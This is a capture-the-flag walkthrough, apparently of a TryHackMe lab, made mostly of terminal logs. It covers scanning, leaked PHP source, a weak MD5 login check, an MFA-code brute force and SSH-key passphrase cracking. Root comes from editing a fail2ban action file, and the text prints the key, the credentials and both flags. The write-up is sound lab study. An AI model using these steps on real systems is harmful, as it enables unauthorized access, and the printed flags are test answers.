----
Stay out of my server!
----

![](https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1470&q=80)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/55ca2dd6bf60ecc7c1e960ad974fff90.png)

### Task 1  Take a bite

 Start Machine

Start the machine and get the flags...

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.201.234 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.201.234:22
Open 10.10.201.234:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 12:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:21
Completed Parallel DNS resolution of 1 host. at 12:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:21
Scanning 10.10.201.234 [2 ports]
Discovered open port 22/tcp on 10.10.201.234
Discovered open port 80/tcp on 10.10.201.234
Completed Connect Scan at 12:21, 0.20s elapsed (2 total ports)
Initiating Service scan at 12:21
Scanning 2 services on 10.10.201.234
Completed Service scan at 12:21, 6.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.201.234.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:22, 6.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Nmap scan report for 10.10.201.234
Host is up, received user-set (0.20s latency).
Scanned at 2023-06-23 12:21:50 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89ec671a8587c6f664ada7d19e3a1194 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f6b3cf82150d98b520434a54d033a26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c45be5269406ee76217527bccdbaafcc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:22
Completed NSE at 12:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.201.234 -i200,301,302,401,500 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.201.234/_23-06-23_12-24-31.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-06-23_12-24-31.log

Target: http://10.10.201.234/

[12:24:32] Starting: 
[12:25:50] 301 -  316B  - /console  ->  http://10.10.201.234/console/
[12:25:51] 200 -    4KB - /console/
[12:26:12] 200 -   11KB - /index.html

Task Completed

https://matthewfl.com/unPacker.html

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))

document.getElementById('clicked').value='yes';
console.log('@fred I turned on php file syntax highlighting for you to review... jason');


https://www.php.net/manual/en/function.highlight-file.php

Many servers are configured to automatically highlight files with a _phps_ extension. For example, example.phps when viewed will show the syntax highlighted source of the file.

http://10.10.201.234/console/index.phps

<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>

http://10.10.201.234/console/functions.phps

 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 

http://10.10.201.234/console/config.phps

 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 

┌──(witty㉿kali)-[~/Downloads]
└─$ php -a
Interactive shell

php > echo hex2bin('6a61736f6e5f746573745f6163636f756e74');
jason_test_account

┌──(witty㉿kali)-[~/Downloads]
└─$ cat php_md5.php 
<?php

$file = fopen('/usr/share/wordlists/rockyou.txt', 'r');

while (($line = fgets($file)) !== false) {
    $pass = trim($line);
    $hash = md5($pass);
    
    if (substr($hash, -3) === '001') {
        echo $pass . "\n";
        break;
    }
}

fclose($file);
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ php php_md5.php
violet

jason_test_account:violet

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'@2 3 4 5 6 7 8 9 a b c, d e f g h... i\');',19,19,'console|log|fred|we|need|to|put|some|brute|force|protection|on|here|remind|me|in|the|morning|jason'.split('|'),0,{}));

console.log('@fred we need to put some brute force protection on here, remind me in the morning... jason');

using burp intruder

code=§1234§ from 1000 to 9999

code 302 I got 2766 

File browser

/home fred and jason

/home/jason

.bash_history
.bash_logout
.bashrc
.cache
.config
.gnupg
.profile
.ssh
.sudo_as_admin_successful
user.txt

File viewer

/home/jason/user.txt

THM{6fbf1fb7241dac060cd3abba70c33070}

/home/jason/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano bite_idrsa         
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ cat bite_idrsa         
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,983BDF3BE962B7E88A5193CD1551E9B9

nspZgFs2AHTCqQUdGbA0reuNel2jMB/3yaTZvAnqYt82m6Kb2ViAqlFtrvxJUTkx
vbc2h5vIV7N54sHQvFzmNcPTmOpy7cp4Wnd5ttgGpykiBTni6xeE0g2miyEUu+Qj
JaLEJzzdiehg0R3LDqZqeuVvy9Cc1WItPuKRLHJtoiKHsFvm9arbW4F/Jxa7aVgH
l5rfo6pEI0liruklDfFrDjz96OaRtdkOpM3Q3GxYV2Xm4h/Eg0CamC7xJC8RHr/w
EONcJm5rHB6nDVV5zew+dCpYa83dMViq7LOGEZ9QdsVqHS59RYEffMc45jkKv3Kn
ky+y75CgYCWjtLbhUc4Ml21kYz/pDdObncIRH3m6aF3w/b0F/RlyAYQYUYGfR3/5
Y9a2/hVbBLX7oM+KQqWHD5c05mLNfAYWTUxtbANVy797CSzYssMcCrld7OnDtFx7
qPonOIRjgtfCodJuCou0o3jRpzwCwTyfOvnd29SF70rN8klzjpxvqNEEbSfnh04m
ss1fTMX1eypmCsHecmpjloTxdPdj1aDorwLkJZtn7h+o3mkWG0H8vnCZArtxeiiX
t/89evJXhVKHSgf83xPvCUvnd2KSjTakBNmsSKoBL2b3AN3S/wwapEzdcuKG5y3u
wBvVfNpAD3PmqTpvFLClidnR1mWE4r4G1dHwxjYurEnu9XKO4d+Z1VAPLI2gTmtd
NblKTwZQCWp20rRErOyT9MxjT1gTkVmpiJ0ObzQHOGKJIVaMS8oEng2gYs48nugS
AsafORd3khez4r/5g9opRj8rdCkK83fG5WA15kzcOJ+BqiKyGU26hCbNuOAHaAbq
Zp+Jqf4K6FcKsrL2VVCmPKOvkTEItVIFGDywp3u+v0LGjML0wbrGtGzP7pPqYTZ5
gJ4TBOa5FUfhQPAJXXJU3pz5svAHgTsTMRw7p8CSfedCW/85bMWgzt5XuQdiHZA0
FeZErRU54+ntlJ1YdLEjVWbhVhzHyBXnEXofj7XHaNvG7+r2bH8GYL6PeSK1Iiz7
/SiK/v4kjOP8Ay/35YFyfCYCykhdJO648MXb+bjblrAJldeXO2jAyu4LlFlJlv6/
bKB7viLrzVDSzXIrFHNoVdFmLqT3yEmui4JgFPgtWoHUOQNUw8mDdfCR0x3GAXZP
XIU1Yn67iZ9TMz6z8HDuc04GhiE0hzI6JBKJP8vGg7X8rBuA7DgoFujSOg7e8HYX
7t07CkDJcAfqy/IULQ8pWtEFTSXz1bFpl360v42dELc6BwhYu4Z4qza9FtYS0L/d
ts5aw3VS07Xp5v/pX+RogV8uIa0jOKTkVy5ZnnlJk1qa9zWX3o8cz0P4TualAn+h
dQBVNOgRIZ11a6NU0bhLCJTL2ZheUwe9MTqvgRn1FVsv4yFGo/hIXb6BtXQE74fD
xF6icxCBWQSbU8zgkl2QHheONYdfNN0aesoFGWwvRw0/HMr4/g3g7djFc+6rrbQY
xibeJfxvGyw0mp2eGebQDM5XiLhB0jI4wtVlvkUpd+smws03mbmYfT4ghwCyM1ru
VpKcbfvlpUuMb4AH1KN0ifFJ0q3Te560LYc7QC44Y1g41ZmHigU7YOsweBieWkY2
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 bite_idrsa  
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh2john bite_idrsa > bite_hash.txt
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt bite_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1a2b3c4d         (bite_idrsa)     
1g 0:00:00:00 DONE (2023-06-23 12:57) 16.66g/s 83733p/s 83733c/s 83733C/s christina1..dumnezeu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i bite_idrsa jason@10.10.201.234
The authenticity of host '10.10.201.234 (10.10.201.234)' can't be established.
ED25519 key fingerprint is SHA256:3NvL4FLmtivo46j76+yqa43LcYEB79JAUuXUAYQe/zI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.201.234' (ED25519) to the list of known hosts.
Enter passphrase for key 'bite_idrsa': 
Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
jason@biteme:~$ id
uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL

jason@biteme:~$ sudo -u fred bash
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban

https://www.fail2ban.org/wiki/index.php/Main_Page

fred@biteme:~$ cat /etc/fail2ban/jail.local 
[sshd]
enabled   = true
maxretry  = 3
findtime  = 2m
bantime   = 2m
banaction = iptables-multiport

https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/

fred@biteme:~$ ls -lah /etc/fail2ban/action.d
total 288K
drwxrwxrwx 2 root root 4.0K Nov 13  2021 .
drwxr-xr-x 6 root root 4.0K Nov 13  2021 ..
-rw-r--r-- 1 root root 3.8K Jan 18  2018 abuseipdb.conf
-rw-r--r-- 1 root root  587 Jan 18  2018 apf.conf
-rw-r--r-- 1 root root  629 Jan 18  2018 badips.conf
-rw-r--r-- 1 root root  11K Jan 18  2018 badips.py
-rw-r--r-- 1 root root 2.6K Jan 18  2018 blocklist_de.conf
-rw-r--r-- 1 root root 3.1K Jan 18  2018 bsd-ipfw.conf
-rw-r--r-- 1 root root 2.7K Jan 18  2018 cloudflare.conf
-rw-r--r-- 1 root root 4.6K Jan 18  2018 complain.conf
-rw-r--r-- 1 root root 7.5K Jan 18  2018 dshield.conf
-rw-r--r-- 1 root root 1.6K Jan 18  2018 dummy.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 firewallcmd-allports.conf
-rw-r--r-- 1 root root 2.6K Jan 18  2018 firewallcmd-common.conf
-rw-r--r-- 1 root root 2.2K Jan 18  2018 firewallcmd-ipset.conf
-rw-r--r-- 1 root root 1.3K Jan 18  2018 firewallcmd-multiport.conf
-rw-r--r-- 1 root root 1.9K Jan 18  2018 firewallcmd-new.conf
-rw-r--r-- 1 root root 2.3K Jan 18  2018 firewallcmd-rich-logging.conf
-rw-r--r-- 1 root root 1.8K Jan 18  2018 firewallcmd-rich-rules.conf
-rw-r--r-- 1 root root  589 Jan 18  2018 helpers-common.conf
-rw-r--r-- 1 root root 1.4K Jan 18  2018 hostsdeny.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 ipfilter.conf
-rw-r--r-- 1 root root 1.4K Jan 18  2018 ipfw.conf
-rw-r--r-- 1 root root 1.4K Jan 18  2018 iptables-allports.conf
-rw-r--r-- 1 root root 2.7K Jan 18  2018 iptables-common.conf
-rw-r--r-- 1 root root 1.4K Jan 18  2018 iptables.conf
-rw-r--r-- 1 root root 2.0K Jan 18  2018 iptables-ipset-proto4.conf
-rw-r--r-- 1 root root 2.2K Jan 18  2018 iptables-ipset-proto6-allports.conf
-rw-r--r-- 1 root root 2.2K Jan 18  2018 iptables-ipset-proto6.conf
-rw-r--r-- 1 fred root 1.4K Nov 13  2021 iptables-multiport.conf
-rw-r--r-- 1 root root 2.1K Jan 18  2018 iptables-multiport-log.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 iptables-new.conf
-rw-r--r-- 1 root root 2.6K Jan 18  2018 iptables-xt_recent-echo.conf
-rw-r--r-- 1 root root 2.3K Jan 18  2018 mail-buffered.conf
-rw-r--r-- 1 root root 1.6K Jan 18  2018 mail.conf
-rw-r--r-- 1 root root 1.1K Jan 18  2018 mail-whois-common.conf
-rw-r--r-- 1 root root 1.8K Jan 18  2018 mail-whois.conf
-rw-r--r-- 1 root root 2.3K Jan 18  2018 mail-whois-lines.conf
-rw-r--r-- 1 root root 5.2K Jan 18  2018 mynetwatchman.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 netscaler.conf
-rw-r--r-- 1 root root  490 Jan 18  2018 nftables-allports.conf
-rw-r--r-- 1 root root 4.0K Jan 18  2018 nftables-common.conf
-rw-r--r-- 1 root root  496 Jan 18  2018 nftables-multiport.conf
-rw-r--r-- 1 root root 3.7K Jan 18  2018 nginx-block-map.conf
-rw-r--r-- 1 root root 1.5K Jan 18  2018 npf.conf
-rw-r--r-- 1 root root 3.1K Jan 18  2018 nsupdate.conf
-rw-r--r-- 1 root root  469 Jan 18  2018 osx-afctl.conf
-rw-r--r-- 1 root root 2.2K Jan 18  2018 osx-ipfw.conf
-rw-r--r-- 1 root root 3.6K Jan 18  2018 pf.conf
-rw-r--r-- 1 root root 1023 Jan 18  2018 route.conf
-rw-r--r-- 1 root root 2.8K Jan 18  2018 sendmail-buffered.conf
-rw-r--r-- 1 root root 1.8K Jan 18  2018 sendmail-common.conf
-rw-r--r-- 1 root root  857 Jan 18  2018 sendmail.conf
-rw-r--r-- 1 root root 1.8K Jan 18  2018 sendmail-geoip-lines.conf
-rw-r--r-- 1 root root  977 Jan 18  2018 sendmail-whois.conf
-rw-r--r-- 1 root root 1.1K Jan 18  2018 sendmail-whois-ipjailmatches.conf
-rw-r--r-- 1 root root 1.1K Jan 18  2018 sendmail-whois-ipmatches.conf
-rw-r--r-- 1 root root 1.3K Jan 18  2018 sendmail-whois-lines.conf
-rw-r--r-- 1 root root  997 Jan 18  2018 sendmail-whois-matches.conf
-rw-r--r-- 1 root root 2.1K Jan 18  2018 shorewall.conf
-rw-r--r-- 1 root root 3.0K Jan 18  2018 shorewall-ipset-proto6.conf
-rw-r--r-- 1 root root 6.0K Jan 18  2018 smtp.py
-rw-r--r-- 1 root root 1.3K Jan 18  2018 symbiosis-blacklist-allports.conf
-rw-r--r-- 1 root root 1.1K Jan 18  2018 ufw.conf
-rw-r--r-- 1 root root 6.0K Jan 18  2018 xarf-login-attack.conf

fred@biteme:~$ ls -lah /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 fred root 1.4K Nov 13  2021 /etc/fail2ban/action.d/iptables-multiport.conf

fred@biteme:~$ nano /etc/fail2ban/action.d/iptables-multiport.conf
Unable to create directory /home/jason/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue

fred@biteme:~$ cat /etc/fail2ban/action.d/iptables-multiport.conf
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt

fred@biteme:~$ sudo systemctl restart fail2ban

fred@biteme:~$ exit
exit
jason@biteme:~$ exit
logout
Connection to 10.10.201.234 closed.

3 times error 

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh jason@10.10.201.234     
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
jason@10.10.201.234: Permission denied (publickey,password).

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh jason@10.10.201.234                                                
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
jason@10.10.201.234: Permission denied (publickey,password).
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh jason@10.10.201.234
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
Permission denied, please try again.
jason@10.10.201.234's password: 
jason@10.10.201.234: Permission denied (publickey,password).
                                                                                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i bite_idrsa jason@10.10.201.234
Enter passphrase for key 'bite_idrsa': 
Last login: Fri Jun 23 17:07:00 2023 from 10.8.19.103
jason@biteme:~$ cd /tmp
jason@biteme:/tmp$ ls
root.txt
systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-apache2.service-B8MM2X
systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-systemd-resolved.service-aEzNPq
systemd-private-3e4e476e6d18475fbd0b7b5792be96dc-systemd-timesyncd.service-HLvIml
jason@biteme:/tmp$ cat root.txt 
THM{0e355b5c907ef7741f40f4a41cc6678d}


```

![[Pasted image 20230623114704.png]]

What is the user flag?

*THM{6fbf1fb7241dac060cd3abba70c33070}*

What is the root flag?

*THM{0e355b5c907ef7741f40f4a41cc6678d}*


[[HaskHell]]